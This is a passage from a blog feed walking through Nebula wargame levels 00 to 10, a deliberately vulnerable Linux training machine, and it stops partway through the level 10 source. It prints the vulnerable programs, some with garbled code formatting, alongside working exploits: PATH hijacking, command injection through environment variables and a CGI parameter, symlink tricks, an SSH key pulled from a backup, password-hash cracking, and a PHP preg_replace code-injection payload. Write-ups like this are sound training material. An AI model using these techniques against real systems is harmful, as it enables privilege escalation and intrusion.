<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: wargames | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/wargames/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2018-11-17T08:21:04-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Exploit Exercises - Nebula levels 00-10]]></title>
    <link href="http://chousensha.github.io/blog/2016/01/09/exploit-exercises-nebula-levels-00-10/"/>
    <updated>2016-01-09T09:50:44-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/01/09/exploit-exercises-nebula-levels-00-10</id>
    <content type="html"><![CDATA[<p><a href="https://exploit-exercises.com/">exploit-exercises.com</a> provides a variety of virtual machines, documentation and challenges that can be used to learn about a variety of computer security issues such as privilege escalation, vulnerability analysis, exploit development, debugging, reverse engineering, and general cyber security issues.</p>

<p>Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at</p>

<ul>
<li>  SUID files</li>
<li>  Permissions</li>
<li>  Race conditions</li>
<li>  Shell meta-variables</li>
<li>  $PATH weaknesses</li>
<li>  Scripting language weaknesses</li>
<li>  Binary compilation failures</li>
</ul>


<p>At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.</p>

<p>I am doing these levels by SSH'ing into the box, rather than directly in the Nebula terminal.</p>

<p>Because my posts tend to become gigantic when I am focusing on a single challenge and it takes alot of time between them, I am going to break them up into smaller posts from now on, hence why I will cover only the levels from 00 to 10 in this post.</p>

<!-- more -->


<h3>Level00</h3>

<p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>

<p>Alternatively, look at the find man page.</p>

<p>To access this level, log in as level00 with the password of level00.</p>

<p>After logging in, use the <em>find</em> command like this: <code>sudo find / -user flag00 -perm -4000 -print 2> /dev/null</code>. It prints all SUID files of the flag00 user and all error output is thrown in the black hole. So you will find the binary in <code>/rofs/bin/&hellip;/flag00</code>. You could also have looked for it directly, by noticing the rofs folder which doesn&rsquo;t normally exist in a Linux installation. Run the binary and you will see this message:</p>

<p><code>plain
Congrats, now run getflag to get your flag!
</code></p>

<p>Run getflag and level complete:</p>

<p><code>plain
You have successfully executed getflag on a target account
</code></p>

<h3>Level01</h3>

<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>

<p>To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.</p>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();</p>

<p>  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);</p>

<p>  system(&ldquo;/usr/bin/env echo and now what?&rdquo;);
}
```</p>

<p>This is a SUID program owned by the flag01 user. When run it outputs <em>and now what?</em>. The <em>env</em> program is the one that actually invokes the <em>echo</em> command, and it doesn&rsquo;t use an absolute path. <em>env</em> runs a program in a modified environment and it looks in the  $PATH for the executable it&rsquo;s supposed to run. So we can make an executable of our own, name it <em>echo</em>, and add it to the path, so that it will take precedence over the others.</p>

<p>First, let&rsquo;s see our current path:</p>

<p><code>plain
level01@nebula:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
</code></p>

<p>I&rsquo;m going to add my <em>echo</em> program to the path to be searched before anywhere else:</p>

<p><code>plain
level01@nebula:~$ PATH=/tmp:$PATH
level01@nebula:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
</code></p>

<p>And now create an <em>echo</em> file in <em>/tmp/</em>, that will run <em>getflag</em> (and make it executable):</p>

<p><code>plain
level01@nebula:/tmp$ cat echo
/bin/getflag
</code></p>

<p>Now go back and run the <em>flag01</em> binary:</p>

<p><code>plain
level01@nebula:/home/flag01$ ./flag01
You have successfully executed getflag on a target account
</code></p>

<h3>Level02</h3>

<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>

<p>To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.</p>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  char *buffer;</p>

<p>  gid_t gid;
  uid_t uid;</p>

<p>  gid = getegid();
  uid = geteuid();</p>

<p>  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);</p>

<p>  buffer = NULL;</p>

<p>  asprintf(&amp;buffer, &ldquo;/bin/echo %s is cool&rdquo;, getenv(&ldquo;USER&rdquo;));
  printf(&ldquo;about to call system(\&rdquo;%s\&ldquo;)\n&rdquo;, buffer);</p>

<p>  system(buffer);
}
```</p>

<p>Running this program outputs the following:</p>

<p><code>plain
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo level02 is cool")
level02 is cool
</code></p>

<p>The vulnerability is based on the fact that <em>getenv</em> is called on the USER environment variable. Since this is a SUID program, it&rsquo;s dangerous to trust the contents of the environment. The manpage actually provides a more secure alternative:</p>

<blockquote><p>The secure_getenv() function is intended  for  use  in  general-purpose
libraries  to  avoid vulnerabilities that could occur if set-user-ID or
set-group-ID programs accidentally trusted the environment.</p></blockquote>

<p>And we can exploit this by modifying the USER variable to make the program execute code of our choosing.</p>

<p><code>plain
level02@nebula:/home/flag02$ export USER='pwned;/bin/getflag;'
level02@nebula:/home/flag02$ echo $USER
pwned;/bin/getflag;
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo pwned;/bin/getflag; is cool")
pwned
You have successfully executed getflag on a target account
sh: is: command not found
</code></p>

<p>So why did this work? Remember this line:</p>

<p><code>c
asprintf(&amp;buffer, "/bin/echo %s is cool", getenv("USER"));
</code></p>

<p>Normally the USER would be level02, so it would look like this: <code>/bin/echo level02 is cool</code>. But we have control of what is returned by <em>getenv</em>. The injection was <code>pwned;/bin/getflag;</code>. So now it becomes this: <code>/bin/echo pwned;/bin/getflag; is cool</code>. The &ldquo;pwned&rdquo; is there just so that the <em>echo</em> command can print something. Then the <strong>;</strong> terminates the <em>echo</em> command and chains a new one, executing <em>getflag</em>. And the final <strong>;</strong> acts to comment out the rest of the string that was to be displayed (notice that bash treated the string as a command and reported that it couldn&rsquo;t find it).</p>

<h3>Level03</h3>

<p>Check the home directory of flag03 and take note of the files there.</p>

<p>There is a crontab that is called every couple of minutes.</p>

<p>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</p>

<p>So we have a shell script and a directory:</p>

<p>``` plain
level03@nebula:/home/flag03$ ls
writable.d  writable.sh
level03@nebula:/home/flag03$ cat writable.sh</p>

<h1>!/bin/sh</h1>

<p>for i in /home/flag03/writable.d/* ; do</p>

<pre><code>(ulimit -t 5; bash -x "$i")
rm -f "$i"
</code></pre>

<p>done</p>

<p>```</p>

<p>So the crontab is executing this script that executes every file in the writable.d directory and then removes it. Which means all we have to do is put a file of our own that calles <em>getflag</em> in the directory, and wait for cron to do its job:</p>

<p><code>plain
level03@nebula:/home/flag03/writable.d$ cat &gt; exeme.sh
/bin/getflag &gt; /tmp/readme
</code></p>

<p>Now wait a bit and check the output:</p>

<p><code>plain
level03@nebula:/tmp$ cat readme
You have successfully executed getflag on a target account
</code></p>

<h3>Level04</h3>

<p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>

<p>To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.</p>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;fcntl.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  char buf[1024];
  int fd, rc;</p>

<p>  if(argc == 1) {</p>

<pre><code>  printf("%s [file to read]\n", argv[0]);
  exit(EXIT_FAILURE);
</code></pre>

<p>  }</p>

<p>  if(strstr(argv[1], &ldquo;token&rdquo;) != NULL) {</p>

<pre><code>  printf("You may not access '%s'\n", argv[1]);
  exit(EXIT_FAILURE);
</code></pre>

<p>  }</p>

<p>  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {</p>

<pre><code>  err(EXIT_FAILURE, "Unable to open %s", argv[1]);
</code></pre>

<p>  }</p>

<p>  rc = read(fd, buf, sizeof(buf));</p>

<p>  if(rc == -1) {</p>

<pre><code>  err(EXIT_FAILURE, "Unable to read fd %d", fd);
</code></pre>

<p>  }</p>

<p>  write(1, buf, rc);
}
```</p>

<p>Right, so our goal is to read the token file:</p>

<p><code>plain
level04@nebula:/home/flag04$ ls
flag04  token
</code></p>

<p>We don&rsquo;t have permission to do so directly. The flag04 executable can read files but it&rsquo;s conveniently coded not to read the token file. However, it&rsquo;s able to read other files just fine, provided we don&rsquo;t run into permission issues. So I went to <em>/tmp</em> and made a symbolic link that points to the token file:</p>

<p><code>plain
level04@nebula:/tmp$ ln -s /home/flag04/token /tmp/readthis
level04@nebula:/tmp$ ls -l readthis
lrwxrwxrwx 1 level04 level04 18 2015-09-04 01:17 readthis -&gt; /home/flag04/token
</code></p>

<p>And now I had the flag04 binary read the symlink, and implicitly, the token:</p>

<p><code>plain
level04@nebula:/home/flag04$ ./flag04 /tmp/readthis
06508b5e-8909-4f38-b630-fdb148a848a2
</code></p>

<p>I was at a loss at what to do with this string, but since our objective is to run <em>getflag</em>, I tried <code>su flag04</code> and used the token as password and it worked. Then it was all a matter of running <em>getflag</em>:</p>

<p><code>plain
sh-4.2$ /bin/getflag
You have successfully executed getflag on a target account
</code></p>

<h3>Level05</h3>

<p>Check the flag05 home directory. You are looking for weak directory permissions</p>

<p>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.</p>

<p>Taking a look in the flag05 directory:</p>

<p><code>plain
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
</code></p>

<p>Ok, the <em>.backup</em> folder seems interesting, let&rsquo;s see what&rsquo;s in there:</p>

<p><code>plain
level05@nebula:/home/flag05/.backup$ ls
backup-19072011.tgz
level05@nebula:/home/flag05/.backup$ tar zxvf backup-19072011.tgz
.ssh/
tar: .ssh: Cannot mkdir: Permission denied
.ssh/id_rsa.pub
tar: .ssh: Cannot mkdir: Permission denied
tar: .ssh/id_rsa.pub: Cannot open: No such file or directory
.ssh/id_rsa
tar: .ssh: Cannot mkdir: Permission denied
tar: .ssh/id_rsa: Cannot open: No such file or directory
.ssh/authorized_keys
tar: .ssh: Cannot mkdir: Permission denied
tar: .ssh/authorized_keys: Cannot open: No such file or directory
tar: Exiting with failure status due to previous errors
</code></p>

<p>Oops! It looks like this is a backup of the <em>.ssh</em> folder but we only have read permissions in this directory:</p>

<p><code>plain
level05@nebula:/tmp$ ls -l /home/flag05/.backup/
total 2
-rw-rw-r-- 1 flag05 flag05 1826 2011-11-20 20:13 backup-19072011.tgz
</code></p>

<p>Not a problem though! We can just move the archive to a directory where we have more freedom:</p>

<p><code>plain
level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz /tmp/
level05@nebula:/tmp$ tar vzxf backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
</code></p>

<p>And now with flag05&rsquo;s private key, we can SSH to the machine and run <em>getflag</em>:</p>

<p>``` plain
level05@nebula:/tmp/.ssh$ ssh -i id_rsa flag05@localhost</p>

<pre><code>  _   __     __          __     
 / | / /__  / /_  __  __/ /___ _
/  |/ / _ \/ __ \/ / / / / __ `/
</code></pre>

<p>   / /|  /  <strong>/ /<em>/ / /</em>/ / / /<em>/ /
  /</em>/ |_/_</strong>/<em>.</em><em><em>/_</em>,</em>/<em>/_</em>,_/</p>

<pre><code>exploit-exercises.com/nebula
</code></pre>

<p>For level descriptions, please see the above URL.</p>

<p>To log in, use the username of &ldquo;levelXX&rdquo; and password &ldquo;levelXX&rdquo;, where
XX is the level number.</p>

<p>Currently there are 20 levels (00 &ndash; 19).</p>

<p>Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a>
New release &lsquo;12.04 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</li>
</ul>


<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h3>Level06</h3>

<p>The flag06 account credentials came from a legacy unix system.</p>

<p>To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.</p>

<p>I looked around a bit, didn&rsquo;t find anything interesting in the files owned by flag06. But keeping the hint in mind, I took a cursory glance at the <code>/etc/passwd</code> file, and bingo!:</p>

<p><code>plain
level06@nebula:/home/flag06$ cat /etc/passwd
...
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
...
</code></p>

<p>The password hash for the flag06 user is inside <em>/etc/passwd</em>! (as a remnant of the old times when this file also contained the passwords for the users). Time to get cracking! I copied the hash to a file and ran John on it:</p>

<p>``` plain
root@kali:~/Desktop# john &mdash;show hash
?:hello</p>

<p>1 password hash cracked, 0 left
```</p>

<p>So the password is <em>hello</em>. Now it&rsquo;s just a matter of ssh'ing and getting the flag:</p>

<p>``` plain
level06@nebula:/home/flag06$ ssh flag06@localhost
The authenticity of host &lsquo;localhost (127.0.0.1)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;localhost&rsquo; (ECDSA) to the list of known hosts.</p>

<pre><code>  _   __     __          __     
 / | / /__  / /_  __  __/ /___ _
/  |/ / _ \/ __ \/ / / / / __ `/
</code></pre>

<p>   / /|  /  <strong>/ /<em>/ / /</em>/ / / /<em>/ /
  /</em>/ |_/_</strong>/<em>.</em><em><em>/_</em>,</em>/<em>/_</em>,_/</p>

<pre><code>exploit-exercises.com/nebula
</code></pre>

<p>For level descriptions, please see the above URL.</p>

<p>To log in, use the username of &ldquo;levelXX&rdquo; and password &ldquo;levelXX&rdquo;, where
XX is the level number.</p>

<p>Currently there are 20 levels (00 &ndash; 19).</p>

<p>flag06@localhost&rsquo;s password:
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a>
New release &lsquo;12.04 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</li>
</ul>


<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>flag06@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h3>Level 07</h3>

<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>

<p>To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.</p>

<p>``` perl</p>

<h1>!/usr/bin/perl</h1>

<p>use CGI qw{param};</p>

<p>print &ldquo;Content-type: text/html\n\n&rdquo;;</p>

<p>sub ping {
  $host = $_[0];</p>

<p>  print(&ldquo;<html><head><title>Ping results</title></head><body><pre>&rdquo;);</p>

<p>  @output = <code>ping -c 3 $host 2&gt;&amp;1</code>;
  foreach $line (@output) { print &ldquo;$line&rdquo;; }</p>

<p>  print(&ldquo;</pre></body></html>&rdquo;);</p>

<p>}</p>

<h1>check if Host set. if not, display normal page, etc</h1>

<p>ping(param(&ldquo;Host&rdquo;));
```</p>

<p>Start by looking inside the <em>thttpd.conf</em> for some options and information about how the server is set up (thttpd is a HTTP server designed for simplicity, speed and portability). I only kept the lines that interested me in the output below:</p>

<p>``` plain
&hellip;</p>

<h1>Specifies an alternate port number to listen on.</h1>

<p>port=7007</p>

<h1>Specifies what user to switch to after initialization when started as root.</h1>

<p>user=flag07
&hellip;
```</p>

<p>So the web server runs as the flag07 user. I pointed my browser to <a href="http://192.168.80.133:7007/index.cgi">http://192.168.80.133:7007/index.cgi</a> and saw some usage output:</p>

<p>``` plain
Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]</p>

<pre><code>        [-p pattern] [-s packetsize] [-t ttl] [-I interface]
        [-M pmtudisc-hint] [-m mark] [-S sndbuf]
        [-T tstamp-options] [-Q tos] [hop1 ...] destination
</code></pre>

<p>```</p>

<p>Looking in the source code, the program needs a Host parameter, otherwise it will display this usage information. I tested it by changing the URL to <a href="http://192.168.80.133:7007/index.cgi?Host=localhost">http://192.168.80.133:7007/index.cgi?Host=localhost</a> and the ping was run successfully:</p>

<p>``` plain
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.025 ms
64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.028 ms
64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.034 ms</p>

<p>&mdash;&ndash; localhost ping statistics &mdash;&ndash;
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.025/0.029/0.034/0.003 ms
```</p>

<p>So it&rsquo;s now a matter of injecting the command we want this program to run. I first tried <a href="http://192.168.80.133:7007/index.cgi?Host=localhost;getflag">http://192.168.80.133:7007/index.cgi?Host=localhost;getflag</a> to stack another command after the ping, but it didn&rsquo;t work. I had to URL encode the ; for it to work: <a href="http://192.168.80.133:7007/index.cgi?Host=localhost%3Bgetflag">http://192.168.80.133:7007/index.cgi?Host=localhost%3Bgetflag</a></p>

<p>``` plain
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.017 ms
64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.036 ms
64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.045 ms</p>

<p>&mdash;&ndash; localhost ping statistics &mdash;&ndash;
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.017/0.032/0.045/0.013 ms
You have successfully executed getflag on a target account
```</p>

<h3>Level 08</h3>

<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>

<p>To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.</p>

<p>There is a capture.pcap file lying around for our convenience. I transfered it to my machine so I can look at it in Wireshark. Followed TCP Stream and saw a potential password:</p>

<p><img class="center" src="/images/nebula/level8.png" title="&lsquo;level8&rsquo; &lsquo;level8&rsquo;" ></p>

<p>So the user tried to log in to something called wwwbugs, which I assumed it&rsquo;s irrelevant to the challenge. I tried SSH'ing as flag08 with the password of <em>backdoor&hellip;00Rm8.ate</em>, but of course it didn&rsquo;t work. Next I tried removing the dots and keeping only the letters and numbers but that didn&rsquo;t work either. But I was fairly sure the password must be related to this string. When looking at the stream in hex, I thought there must be a pattern for those dots:</p>

<p><img class="center" src="/images/nebula/level8hex.png" title="&lsquo;level8hex&rsquo; &lsquo;level8hex&rsquo;" ></p>

<p>The hex for all the dots in the string is <em>7f</em>, but when looking at the Ascii table, hex encoding for dots is <em>2e</em>. So these aren&rsquo;t really dots! At the very end of the Ascii table I saw that <em>7f</em> actually represents the DEL key. So these dots are placeholders for when the DEL key was pressed. The user must have had trouble remembering his password or something. With this discovery in mind, it&rsquo;s possible to reconstruct the valid password:</p>

<ul>
<li><p>backdoor&hellip;00Rm8.ate &ndash;> backdoor + DELETE 3 times = backd</p></li>
<li><p>00Rm8.ate + DELETE 1 time = 00Rmate</p></li>
</ul>


<p>So the password is  <code>backd00Rmate</code>. At least now it looks more like a password. Tried to SSH as flag08 now with this password and it worked!</p>

<p>``` plain
level08@nebula:/home/flag08$ ssh flag08@localhost</p>

<pre><code>  _   __     __          __     
 / | / /__  / /_  __  __/ /___ _
/  |/ / _ \/ __ \/ / / / / __ `/
</code></pre>

<p>   / /|  /  <strong>/ /<em>/ / /</em>/ / / /<em>/ /
  /</em>/ |_/_</strong>/<em>.</em><em><em>/_</em>,</em>/<em>/_</em>,_/</p>

<pre><code>exploit-exercises.com/nebula
</code></pre>

<p>For level descriptions, please see the above URL.</p>

<p>To log in, use the username of &ldquo;levelXX&rdquo; and password &ldquo;levelXX&rdquo;, where
XX is the level number.</p>

<p>Currently there are 20 levels (00 &ndash; 19).</p>

<p>flag08@localhost&rsquo;s password:
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a>
New release &lsquo;12.04 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</li>
</ul>


<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>flag08@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h3>Level 09</h3>

<p>There’s a C setuid wrapper for some vulnerable PHP code…</p>

<p>To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.</p>

<p>``` php
&lt;?php</p>

<p>function spam($email)
{
  $email = preg_replace(&ldquo;/./&rdquo;, &ldquo; dot &rdquo;, $email);
  $email = preg_replace(&ldquo;/@/&rdquo;, &ldquo; AT &rdquo;, $email);</p>

<p>  return $email;
}</p>

<p>function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);</p>

<p>  $contents = preg_replace(&ldquo;/([email (.*)])/e&rdquo;, &ldquo;spam(\&rdquo;\2\&ldquo;)&rdquo;, $contents);
  $contents = preg_replace(&ldquo;/[/&rdquo;, &ldquo;&lt;&rdquo;, $contents);
  $contents = preg_replace(&ldquo;/]/&rdquo;, &ldquo;>&rdquo;, $contents);</p>

<p>  return $contents;
}</p>

<p>$output = markup($argv[1], $argv[2]);</p>

<p>print $output;</p>

<p>?>
```</p>

<p>Ok, me and regex don&rsquo;t get along at all! After looking at the code, I had only 2 ideas / leads:</p>

<ul>
<li><p>the <em>markup</em> function takes a <strong>$use_me</strong> parameter which isn&rsquo;t used in the code</p></li>
<li><p>the solution probably revolves around a <em>preg_replace</em> exploit (I had a distant memory of encountering and exploiting this in another challenge which I couldn&rsquo;t remember)</p></li>
</ul>


<p>After some googling, I found out that indeed <em>preg_replace</em> can be exploited, but first what exactly does this function do?</p>

<ul>
<li><strong>preg_replace($pattern, $replacement, $subject)</strong> &ndash; Searches <em>subject</em> for matches to <em>pattern</em> and replaces them with <em>replacement</em>.</li>
</ul>


<p>Now let&rsquo;s see how and why it can be exploited. From <a href="http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php">http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php</a> I read this:</p>

<blockquote><p>e (PREG_REPLACE_EVAL) &ndash; If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string,
evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes () and NULL chars will
be escaped by backslashes in substituted backreferences.</p></blockquote>

<p>On the page there is also a security warning for using this function and an example of code injection. Remote code execution is possible because unsanitised user input is <em>eval()</em>ed.</p>

<p>Also you can read more about this vulnerability and exploit here: <a href="http://www.madirish.net/402">http://www.madirish.net/402</a></p>

<p>Before anything else, let&rsquo;s just see what happens when running the binary. I made some files in <em>tmp</em> for this purpose to avoid reading superfluous system files:</p>

<p><code>plain
level09@nebula:/home/flag09$ ./flag09 /tmp/test
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
nothing to see here
</code></p>

<p>PHP complained about the missing $argv[2] (remember the <em>$use_me</em> is unused), but it still read the file. If I tried 2 arguments, the error disappeared, but the second file wasn&rsquo;t output (how could they forget to use the <em>$use_me</em>?!). Ok, enough of that! So I know now that I can get arbitrary code execution by injecting some code to be <em>eval()</em>ed by <em>preg_replace</em>. This means that I will actually have to grasp what the regex is doing&hellip;oh, the fun!</p>

<p>First of all, the line that facilitates the exploitation is:</p>

<p><code>php
$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
</code></p>

<p>This operates on the contents of the file that was read, you can see that the <em>/e</em> modifier is being used, and also that the <em>spam()</em> function is called. This function seems to replace <code>.</code> with <em>dot</em> and <em>@</em> with <em>AT</em>, but I plugged it into a PHP interpreter to be sure:</p>

<p><code>plain
haxor@hack.com becomes haxor AT hack dot com
</code></p>

<p>It is this function where we will inject our code. But we have to match the pattern that is expected. After some pain and suffering, and 2 excellent regex resources that even my regex-incompatible brain could grasp (<a href="http://gnosis.cx/publish/programming/regular_expressions.html">this tutorial</a> and <a href="http://www.rexegg.com/regex-quickstart.html">this cheatsheet</a>), I concluded that the pattern to be matched is like this:</p>

<p><code>plain
[email haxor@hack.com]
</code></p>

<p>After the replacement operations the above becomes <code>haxor AT hack dot com</code> and the [] is replaced with &lt;>. Now for the exploitation. On the <a href="http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php">http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php</a> page, the exploit string for the provided code is:</p>

<p>``` plain</p>

<h1>{${eval($_GET[php_code])}}</h1>


<p>```</p>

<p>I admit I don&rsquo;t understand why it works while sandwiched between {}. The h1 tags and $_GET apply to the example code on the page, so in this case I kept the string:</p>

<p><code>plain
{${eval()}}
</code></p>

<p>Instead of <em>eval()</em>, we want <em>system()</em> to call an external program. Of course don&rsquo;t forget that you have to sandwich it inside the pattern <code>[email ]</code>. Now it becomes:</p>

<p><code>plain
[email {${system()}}]
</code></p>

<p>Cool. Now we want to run <em>getflag</em>, so how should we pass it to <em>system()</em>? Remember the unsued variable <em>$use_me</em>!</p>

<p>At this point I injected some harmless printing functions inside an interpreter to check if the injection worked successfully, and when it did, I moved back to our particular case. So here&rsquo;s how the situation looks now:</p>

<ul>
<li><p>we want to run <em>getflag</em></p></li>
<li><p>we can run external commands in PHP with <em>system()</em></p></li>
<li><p>we have the $use_me parameter available and unused anywhere, so why not use it?</p></li>
<li><p>we have to put the exploit into a file to be read by the binary</p></li>
</ul>


<p>With all these requirements in mind, I created a file with the exploit:</p>

<p><code>plain
level09@nebula:/home/flag09$ cat /tmp/useme
[email {${system($use_me)}}]
</code></p>

<p>Now we can finally use that $use_me variable, since whatever we place in it will be executed by <em>system()</em>. Running it now produces an error but it still does the job:</p>

<p><code>plain
level09@nebula:/home/flag09$ ./flag09 /tmp/useme getflag
You have successfully executed getflag on a target account
PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1
</code></p>

<p>Pff, this was a difficult level, but really interesting and I learned something!</p>

<h3>Level 10</h3>

<p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p>

<p>To do this level, log in as the level10 account with the password level10 . Files for this level can be found in /home/flag10.</p>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;errno.h></h1>

<h1>include &lt;sys/socket.h></h1>

<h1>include &lt;netinet/in.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char <em><em>argv)
{
 char </em>file;
 char </em>host;</p>

<p> if(argc &lt; 3) {
  printf(&ldquo;%s file host\n\tsends file to host if you have access to it\n&rdquo;, argv[0]);
  exit(1);
 }</p>

<p> file = argv[1];
 host = argv[2];</p>

<p> if(access(argv[1], R_OK) == 0) {
  int fd;
  int ffd;
  int rc;
  struct sockaddr_in sin;
  char buffer[4096];</p>

<p>  printf(&ldquo;Connecting to %s:18211 .. &rdquo;, host); fflush(stdout);</p>

<p>  fd = socket(AF_INET, SOCK_STREAM, 0);</p>

<p>  memset(&amp;sin, 0, sizeof(struct sockaddr_in));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(host);
  sin.sin_port = htons(18211);</p>

<p>  if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
   printf(&ldquo;Unable to connect to host %s\n&rdquo;, host);
   exit(EXIT_FAILURE);
  }</p>

<h1>define HITHERE &ldquo;.oO Oo.\n&rdquo;</h1>

<p>  if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
